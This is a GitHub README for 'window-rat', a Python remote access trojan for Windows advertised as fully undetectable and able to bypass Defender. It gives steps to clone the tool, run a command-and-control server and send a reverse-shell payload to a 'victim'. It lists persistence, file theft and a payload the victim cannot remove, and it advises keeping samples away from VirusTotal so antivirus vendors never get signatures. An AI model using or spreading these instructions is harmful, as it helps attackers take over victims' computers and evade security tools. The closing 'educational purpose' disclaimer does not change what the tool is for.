# window-rat:

# Introduction:
    A Fully Undectable Window RAT that bypass window 10 Defender protection and also bypass 99.9% of other antivirus protections.
    
![c2a](https://user-images.githubusercontent.com/82051128/201597249-39a6b071-1277-4bbf-a720-f9d1aa537d0e.png)

# C2 Server Requirements:-
       pip install termcolor
       pip install pyfiglet
 
# Installation:
    1. git clone https://github.com/machine1337/window-rat
    2. pip install -r requirements.txt
    3. python3 c2.py (your command server from where u will handle targets)
    4. payload.py (your payload u will send to victim)
    5. IP and Port in both payload.py and server.py Must be same
    
# Usage:
    1. python3 c2.py
    2. Now enter IP (your IP or server in which u want to get reverse shell)
    3. Now enter PORT (which port u want to connect)
    4. Listener will be started
    5. Now go to payload.py line no. 36 and put ip and port of server s.connect(('ipserver', portserver))
    6. test the payload.py on victim system
 
# Commands:-
   -> C2 SERVER COMMANDS:
      ![c21](https://user-images.githubusercontent.com/82051128/201598677-206191a5-c671-4007-9f9a-402db123ec99.png)
   
   -> After Got Connection (type help)
      ![shellc2](https://user-images.githubusercontent.com/82051128/201598869-0b6fe1c8-9ed6-4e4b-997d-42f66a59f0ca.png)

# Warning:
    1. Don't Upload Any Payloads To VirusTotal.com Bcz This tool will not work
       with Time.
    2. Virustotal Share Signatures With AV Comapnies.
    3. Again Don't be an Idiot!

# Features:
    1. Very Simple And Fully Undectable RAT For Windows
    2. Multi Client Handling
    3. Persistent  Shell
    4. Upload File
    5. Download File
    4. Once Victim Execute the Payload And We got Shell Then Victim Can't Remove the payload
       Until the Shell is Open In Attacker System.
    5. U can Convert payload.py to exe using pyinstaller tool in windows.
    
# Note:
    Don't upload exe format to virustotal as I have already uploaded
    Ps payload to virustotal. or u can check this file on nodistribute.com because they
    don't submit signatures to antivirus companies.
    Reason: They will submit this payload to different AV companies
    And as a result this script will not work w.r.t time.
    
# Donations:
   BTC Address:  3Dvzx2RKMR731VSEPXXgPyBq6Ln4JJdYPD
   


# Warning:
    Use this tool Only for Educational Purpose And I will Not be Responsible For ur cruel act.
    
    
